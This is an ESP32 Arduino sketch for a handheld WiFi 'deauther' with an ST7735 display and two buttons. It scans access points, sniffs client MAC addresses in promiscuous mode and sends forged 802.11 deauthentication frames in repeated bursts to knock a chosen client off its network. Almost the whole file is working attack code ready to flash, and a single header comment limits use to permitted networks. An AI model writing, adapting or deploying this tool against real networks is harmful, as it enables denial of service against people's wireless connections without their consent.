/* ESP32 Deauther (minimal, TFT_eSPI ST7735 160x80)
   - TFT_eSPI must be configured in User_Setup (pins match your wiring)
   - Buttons: BTN_SELECT and BTN_ATTACK (change if conflict with TFT pins)
   - IMPORTANT: test only on your own network or networks you have permission to test.
*/

#include <WiFi.h>
#include "esp_wifi.h"
#include <TFT_eSPI.h>

TFT_eSPI tft = TFT_eSPI();

// ==== Buttons (change if conflict with TFT wiring) ====
#define BTN_SELECT 15   // chọn mục tiêu (chuyển AP / client)
#define BTN_ATTACK 23   // nhấn nhanh: tấn công, giữ >1500ms: hủy tấn công

// ==== UI layout ====
#define MAX_AP_SHOW 4
#define MAX_CLIENTS 20

// ==== Deauth packet (reason code 0x0007) ====
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xff,0xff,0xff,0xff,0xff,0xff,   // target (client) -> will overwrite
  0xff,0xff,0xff,0xff,0xff,0xff,   // source (AP)   -> will overwrite
  0xff,0xff,0xff,0xff,0xff,0xff,   // BSSID         -> will overwrite
  0x00,0x00,
  0x07,0x00
};

// ==== structures ====
struct Client {
  uint8_t mac[6];
  int rssi;
  bool used;
};

Client clients[MAX_CLIENTS];
volatile int clientCount = 0;
int currentClient = 0;

// AP scan
int networksFound = 0;
int currentAPindex = 0;

// AP info (selected)
uint8_t apBSSID[6];
int apChannel = 1;

bool attacking = false;
unsigned long lastSelectMillis = 0;
unsigned long lastAttackMillis = 0;

// ==== forward declarations ====
void sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type);

void macToStr(const uint8_t *mac, char *out) {
  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void sendDeauthOnce(const uint8_t* client, const uint8_t* ap) {
  memcpy(&deauthPacket[4], client, 6);
  memcpy(&deauthPacket[10], ap, 6);
  memcpy(&deauthPacket[16], ap, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void sendDeauthRepeat(const uint8_t* client, const uint8_t* ap, int bursts, int perBurstDelayMs) {
  for (int b=0; b<bursts; ++b) {
    sendDeauthOnce(client, ap);
    delay(perBurstDelayMs);
  }
}

// ---- promiscuous callback (runs in WiFi context) ----
void sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *payload = p->payload;
  int rssi = p->rx_ctrl.rssi;

  if (p->rx_ctrl.sig_len < 24) return;

  uint8_t clientMac[6];
  memcpy(clientMac, payload + 10, 6);

  if (memcmp(clientMac, apBSSID, 6) == 0) return;

  for (int i=0;i<clientCount;i++) {
    if (memcmp(clients[i].mac, clientMac, 6) == 0) return;
  }

  if (clientCount < MAX_CLIENTS) {
    memcpy(clients[clientCount].mac, clientMac, 6);
    clients[clientCount].rssi = rssi;
    clients[clientCount].used = true;
    clientCount++;
  }
}

// ---- utility: refresh AP scan and show ----
void scanAndShowAPs() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(0,0);

  networksFound = WiFi.scanNetworks();
  if (networksFound <= 0) {
    tft.println("No WiFi found");
    return;
  }

  tft.println("Found:");
  int show = min(networksFound, MAX_AP_SHOW);
  for (int i=0;i<show;i++) {
    String ss = WiFi.SSID(i);
    tft.printf("%d:%s\n", i+1, ss.c_str());
  }
  currentAPindex = 0;
}

void showSelectedAP() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(0,0);
  tft.printf("AP %d/%d\n", currentAPindex+1, networksFound);
  String ss = WiFi.SSID(currentAPindex);
  tft.print("SSID: "); tft.println(ss);
  tft.printf("RSSI: %d dBm\n", WiFi.RSSI(currentAPindex));

  char bstr[20];
  const uint8_t *bptr = WiFi.BSSID(currentAPindex);
  if (bptr) {
    macToStr(bptr, bstr);
    tft.print("BSSID: "); tft.println(bstr);
  } else {
    tft.println("BSSID: N/A");
  }
  int ch = WiFi.channel(currentAPindex);
  tft.printf("Ch: %d\n", ch);
}

void startSniffingForAP() {
  const uint8_t *bptr = WiFi.BSSID(currentAPindex);
  if (!bptr) return;
  memcpy(apBSSID, bptr, 6);
  apChannel = WiFi.channel(currentAPindex);
  if (apChannel <= 0) apChannel = 1;

  esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);

  clientCount = 0;
  currentClient = 0;
  for (int i=0;i<MAX_CLIENTS;i++) clients[i].used = false;

  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);

  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);

  #if ESP_IDF_VERSION_MAJOR >= 4
    esp_wifi_set_promiscuous(true);
  #else
    wifi_promiscuous_enable(true);
  #endif

  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN);
  tft.setCursor(0,0);
  tft.println("Sniffing clients...");
}

void stopSniffing() {
  #if ESP_IDF_VERSION_MAJOR >= 4
    esp_wifi_set_promiscuous(false);
  #else
    wifi_promiscuous_enable(false);
  #endif
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void showClients() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0,0);
  tft.setTextColor(TFT_CYAN);
  tft.println("Clients:");
  int show = min(clientCount, 6);
  char macs[20];
  for (int i=0;i<show;i++) {
    macToStr(clients[i].mac, macs);
    if (i==currentClient) tft.setTextColor(TFT_YELLOW); else tft.setTextColor(TFT_WHITE);
    tft.printf("%d:%s %d\n", i+1, macs, clients[i].rssi);
  }
  if (clientCount == 0) {
    tft.setTextColor(TFT_GREEN);
    tft.println("No clients yet");
  }
}

void setup() {
  Serial.begin(115200);
  delay(100);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(0,0);
  tft.println("Deauther boot");

  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_ATTACK, INPUT_PULLUP);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(200);

  tft.println("Scanning...");
  delay(200);
  scanAndShowAPs();
  if (networksFound > 0) showSelectedAP();
}

void loop() {
  if (digitalRead(BTN_SELECT) == LOW) {
    if (millis() - lastSelectMillis > 250) {
      lastSelectMillis = millis();
      if (clientCount == 0) {
        if (networksFound == 0) {
          scanAndShowAPs();
          return;
        }
        currentAPindex = (currentAPindex + 1) % networksFound;
        showSelectedAP();
        startSniffingForAP();
        delay(300);
        showClients();
      } else {
        if (clientCount > 0) {
          currentClient = (currentClient + 1) % clientCount;
          showClients();
        }
      }
    }
    while(digitalRead(BTN_SELECT) == LOW) delay(10);
  }

  if (digitalRead(BTN_ATTACK) == LOW) {
    unsigned long t0 = millis();
    while (digitalRead(BTN_ATTACK) == LOW) {
      if (!attacking && (millis() - t0 > 50)) break;
      if (attacking && (millis() - t0 > 1500)) {
        attacking = false;
        stopSniffing();
        scanAndShowAPs();
        if (networksFound>0) showSelectedAP();
        return;
      }
      delay(10);
    }

    if (!attacking && clientCount > 0) {
      attacking = true;
      esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0,0); tft.setTextColor(TFT_RED);
      char mstr[20]; macToStr(clients[currentClient].mac, mstr);
      tft.print("ATTACK -> "); tft.println(mstr);
    }
    delay(150);
  }

  if (attacking && clientCount > 0) {
    sendDeauthRepeat(clients[currentClient].mac, apBSSID, 3, 10);
    delay(50);

    if (digitalRead(BTN_ATTACK) == LOW) {
      unsigned long t1 = millis();
      while (digitalRead(BTN_ATTACK) == LOW) {
        if (millis() - t1 > 1500) {
          attacking = false;
          stopSniffing();
          scanAndShowAPs();
          if (networksFound > 0) showSelectedAP();
          return;
        }
        delay(10);
      }
    }
  }

  static unsigned long lastRefresh = 0;
  if (millis() - lastRefresh > 2000) {
    lastRefresh = millis();
    if (clientCount > 0 && !attacking) showClients();
  }
}